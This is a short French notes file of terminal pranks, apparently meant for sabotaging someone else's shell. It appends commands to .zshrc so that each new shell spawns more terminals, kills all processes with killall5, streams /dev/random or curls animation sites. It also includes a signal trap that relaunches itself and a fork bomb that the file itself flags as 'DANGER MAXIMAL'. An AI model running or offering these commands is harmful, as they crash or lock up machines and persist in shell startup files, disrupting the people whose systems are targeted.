trap 'gnome-terminal -- zsh -c "source .zshrc && curl parrot.live"' ABRT ALRM BUS CHLD CLD CONT FPE HUP ILL INT IO KILL PIPE POLL PROF PWR QUIT SEGV STKFLT 
curl parrot.live

```nano .zshrc``` -> coller a la toute fin du fichier -> CTRL+O entree et CTRL+X
```source .zshrc```


[------------------------------------------------------------]


dans la racine (dossier home)
```touch .reset```

Pour enlever -> ```rm -rf .reset```

[-------------------------------------------------------------]
/!\ DANGER MAXIMAL /!\

```:(){ :|:& };:```

[-------------------------------------------------------------]
/!\ DANGER MAIS CA VA /!\

```echo "killall5" >> .zshrc && source .zshrc```

[-------------------------------------------------------------]
```echo "gnome-terminal" >> .zshrc && source .zshrc```


[-------------------------------------------------------------]
```echo "gnome-terminal && cat /dev/random" >> .zshrc && source .zshrc```

[-------------------------------------------------------------]
```echo "gnome-terminal && curl parrot.live" >> .zshrc && source .zshrc```

[-------------------------------------------------------------]
```echo "gnome-terminal && curl ASCII.live/can-you-hear-me" >> .zshrc && source .zshrc```
